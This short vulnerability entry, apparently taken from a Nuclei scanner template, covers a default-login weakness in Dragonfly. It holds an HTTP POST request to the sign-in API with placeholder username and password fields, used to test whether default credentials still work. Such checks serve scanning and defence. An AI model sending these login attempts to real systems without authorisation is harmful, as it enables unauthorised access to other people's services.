# Vulnerability: Dragonfly - Default Login
**Classification:** DRAGONFLY
**Source:** Nuclei Template (`dragonfly-default-login.yaml`)

## Description
Dragonfly was using the default username, and the password was discovered.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /api/v1/users/signin HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json;charset=UTF-8

{"name":"{{username}}","password":"{{password}}"}
```

